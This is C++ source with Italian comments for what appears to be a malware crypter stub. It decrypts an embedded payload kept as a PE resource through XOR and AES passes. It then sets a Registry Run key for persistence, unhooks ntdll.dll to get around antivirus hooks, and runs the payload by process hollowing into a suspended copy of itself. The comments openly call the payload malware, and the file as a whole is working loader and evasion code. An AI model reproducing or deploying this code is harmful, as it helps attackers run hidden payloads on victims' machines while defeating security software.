
#include "encrypt.h"
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>

void RunPE_self(void*);

//funzione che prende le risorse di un PE
unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* dwSize) { 
    HGLOBAL hResData; 
    HRSRC   hResInfo; // handle to resource info in hModule
    unsigned char* pvRes; // pointer to resource data buffer
    HMODULE hModule = GetModuleHandle(NULL); // handle to DLL module

    // find the resource Load the resource and lock it
    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceString)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL)) 
    {
        printf("Got resource : %d\n", resourceId);
        *dwSize = SizeofResource(hModule, hResInfo); //mi salvo la grandezza delle risorse
        return 	pvRes;
    }
    // quit if no resource found
    printf("Failed to get resource : %d\n", resourceId);
    *dwSize = 0;
    return 0;
}

void CreateRunKey(char *path){
    if(TRUE){  //AGGIUNGERE argomento da linea di comando
            printf("\n creating Registry Run KEY \n"); //rendo il processo persistent
            HKEY hkey = NULL;
            // malicious app
            const char* exe = path;

            // startup
            LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
            if (res == ERROR_SUCCESS) {
                // create new registry key
                RegSetValueEx(hkey, (LPCSTR)"prova", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
                RegCloseKey(hkey);
            }     
        }
}

int ntdllUnhooking(){


    // Get handle to self
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};

    // Get handle to ntdll.dll
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll"); //prendi handle alla ntdll.dll (QUESTA NTDLL E' HOOKATA DALL ANTIVIRUS!!!)

    // Parse ntdll.dll from disk
	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); //apri il file ntdll.dll
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		// Update .text section
		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) { //quando arrivi alla sezione .text della ntdll.dll sovrascrivila con una versione originale
			DWORD oldProtection = 0;
			BOOL isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

    
	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);

    printf("NTDLL UNHOOKATA CON SUCCESSO\n");

	return 0;
}


void RunPE_self(void* pe){

    char currentFilePath[512];

    IMAGE_DOS_HEADER* DOSHeader; // DOS header ovvero i primi 64 byte del nostro malware e primo header del PE
    IMAGE_NT_HEADERS64* NtHeader; // NT header ovvero i successivi 248 byte del nostro malware e secondo header del PE
    IMAGE_SECTION_HEADER* SectionHeader; // Section header ovvero i successivi 40 byte del nostro malware e header delle sezioni del PE

    PROCESS_INFORMATION PI; // struct che contiene informazioni sul processo che creeremo
    STARTUPINFOA SI;    // it is a struct that specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.

    CONTEXT* CTX; // struct che contiene i registri del processo che vogliamo attaccare

    void* pImageBase; //puntatore all' inizio dell' immagine eseguibile(letteralmente il file .exe) del processo che vogliamo attaccarE

    DOSHeader = PIMAGE_DOS_HEADER(pe);   // assegno a DOSHeader il puntatore al DOSHeader
    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);  // assegno a NtHeader il puntatore al NtHeader calcolandolo
    // come indirizzo del DOS header + e_lfanew che sarebbe l' offset del NT header rispetto all' inizio del DOS header

    //checko se il NT header e' valido: dal msdn:
    //Signature:
    //A 4-byte signature identifying the file as a PE image. The bytes are "PE\0\0".

    printf("magic number DOS_header: %d", DOSHeader->e_magic);

    printf("\nprima del check della signature");
    printf("\nNtHeader: %p", (void*)NtHeader);
    printf("\nNtHeader->Signature: %d", NtHeader->Signature);
    printf("\nIMAGE_NT_SIGNATURE: %d", IMAGE_NT_SIGNATURE);

    if(NtHeader->Signature == IMAGE_NT_SIGNATURE){
        ZeroMemory(&PI, sizeof(PI)); // pulisco la memoria della struct PROCESS_INFORMATION e STARTUPINFOA
        ZeroMemory(&SI, sizeof(SI));
        //al posto di NULL posso specificare il path di un altro file .exe valido come ad esempio notepad.exe
        printf("\nPRIMA GetModuleFileNameA");
        GetModuleFileNameA(NULL,currentFilePath,sizeof(currentFilePath)); //prendo il path del file .exe che sto eseguendo
        printf("\n\nDOPO GetModuleFileNameA");
             
        CreateRunKey(currentFilePath);

        if (CreateProcessA((char*)currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED , NULL, NULL, &SI, &PI)) {                   
            // alloco memoria per la struct CONTEXT
            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); 
            CTX->ContextFlags = CONTEXT_FULL; // setto il flag della struct CONTEXT a CONTEXT_FULL per avere tutti i registri del processo che vogliamo attaccare

            printf("\nDOPO Aver creato il processo(Prima di GetThreadContext)");
            
            //ormai il thread si puo' accesere da PI.hThread perche 
            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) { // prendo i registri del processo che vogliamo attaccare 
                //VirtualAllocEx alloca memoria in un processo esterno dal corrente
                printf("\nPrimaDi VirtualAllocEx");

                pImageBase = VirtualAllocEx( // alloco memoria nel processo che vogliamo attaccare
                        PI.hProcess,
                        LPVOID(NtHeader->OptionalHeader.ImageBase),
                        NtHeader->OptionalHeader.SizeOfImage,   // alloco la stessa memoria che occupa il malware
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE
            );
        //WriteProcessMemory Writes data to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails.


            printf("\nprima di WriteProcessMemory");

            // scrivo il mio PE malware nella memoria che ho allocato nel processo
            WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL); 
            // assegno e alloco tutte le sezioni del PE nella memoria che ho allocato nel processo
                for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                {



                    // prendo l' i-esima sezione del PE
                    //per calcolarmi l'offset faccio cosi:
                    //ricordiamo (DWORD64(pe) + DOSHeader->e_lfanew) = indirizzo del NT header 
                    //perche' sommo 264 + i*40? perche' 264 e' l' offset del primo section header rispetto all' inizio del NT header, e' i*40? perche' ogni section header e' lungo 40 byte
                    //STA ROBA E' ASSURDA, PER FARSELA DA SOLI TOCCHEREBBE METTERSI A DEBUGGARE LA ROBA O USARE PE-BEAR
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));
                    //scrivo le varie sezioni del mio PE malware
                    WriteProcessMemory(
                            PI.hProcess,
                            LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),//sempre usare virtualAddress, ricorda che l' indirizzo fisico e' dinamico per la allocazione dinamica
                            LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
                            SectionHeader->SizeOfRawData,
                            NULL
                    );
                    //NNON NE HO LA MINIMA IDEA
                    WriteProcessMemory(
                            PI.hProcess,
                            LPVOID(CTX->Rdx + 0x10),
                            LPVOID(&NtHeader->OptionalHeader.ImageBase),
                            8,
                            NULL
                    );

                }

                // setto il registro Rcx del processo  all' entry point del PE malware
                CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                printf("prima di SetThreadContext");

                //setto il contesto (i registri del Process Control Bloc)
                SetThreadContext(PI.hThread, LPCONTEXT(CTX));
                printf("prima di ResumeThread");

                //riprendo l' esecuzione del processo (quindi eseguo il mio malware)
                ResumeThread(PI.hThread);
                printf("prima di WaitForSingleObject");

                WaitForSingleObject(PI.hProcess, NULL);

            }
        }
    }

}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(){
    //FreeConsole(); //questo per nascondere la console mentre lo stub viene eseguitp
    unsigned long malwareLen;
    unsigned long AESkeyLen;
    unsigned long XORkeyLen;
    unsigned long ROTkeyLen;
    unsigned long nAESLen;
    unsigned long nXORLen;

    unsigned char* AESkey;
    unsigned char* XORkey;
    int* ROTkey;

    int* nAES;
    int* nXOR;

    //69 e' l' ID che ho assegnato in crypter_mio.cpp, BIN e' il tipo di risorsa, malwareLen e' la grandezza del malware(pass by reference)
    unsigned char* resourcePtr = GetResource(69, "BIN", &malwareLen); 
    AESkey = GetResource(420,"BIN", &AESkeyLen);
    XORkey = GetResource(421,"BIN", &XORkeyLen);
    ROTkey = (int *)GetResource(422,"BIN", &ROTkeyLen);
    nAES = (int *)GetResource(123,"BIN", &nAESLen);
    nXOR = (int *)GetResource(124,"BIN", &nXORLen);
    /*  
    for(int i = 0; i< 32; i++){
        printf("%x\n", AESkey[i]);
    }
    */
    unsigned char* malware = new unsigned char[malwareLen]; //alloco memoria per il malware
    memcpy(malware, resourcePtr, malwareLen); //copio il malware nelle risorse nella memoria allocata per il malware
    printf("%d",malwareLen);

    
    for(int i = 0; i < *nXOR; i++){
        XOR(malware,malwareLen,(char *)XORkey, 32);
    }
    for(int i = 0; i < *nAES; i++){
        AESDecrypt(malware, malwareLen, (char *)AESkey, 32); //decrypto il malware e lo salvo in pe
    }
    


    //ROT_decrypt(malware,malwareLen,*ROTkey);
    /*
    for(int i = 0; i < 2000; i++){
        printf("%c", malware[i]);
    }
    */

    //Adesso arriva la roba strana del RunPE
    void* pe = malware; // pe sara' il puntatore ai byte del nostro malware

    printf("\nprima di ntdllUnhooking\n");
    ntdllUnhooking();
    printf("\ndopo ntdllUnhooking\n");

    //RunPE_proc(pe);
    for(int i=0;i<2;i++){
        RunPE_self(pe);
    }
    return 0;
}
